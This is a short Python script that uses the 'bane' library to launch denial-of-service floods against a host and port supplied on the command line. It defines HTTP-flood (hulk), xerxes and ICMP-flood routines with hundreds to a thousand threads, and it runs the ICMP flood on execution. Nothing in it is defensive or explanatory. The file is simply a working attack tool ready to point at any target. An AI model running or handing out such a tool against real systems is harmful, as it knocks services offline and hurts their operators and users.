import bane
import os
import sys

def DOS(host,port):
	def hulk():
		res=bane.hulk(host,threads=1000) 
		print(res)

	def xerxes():
		res=bane.xerxes(host, p= int(port) , duration= 300 , threads=500 , timeout=5 ).attack()
		print(res)

	def icmp():
		res=bane.icmp(host,p=int(port),threads=100)
		print(res)
	
	icmp()




DOS(sys.argv[1],sys.argv[2])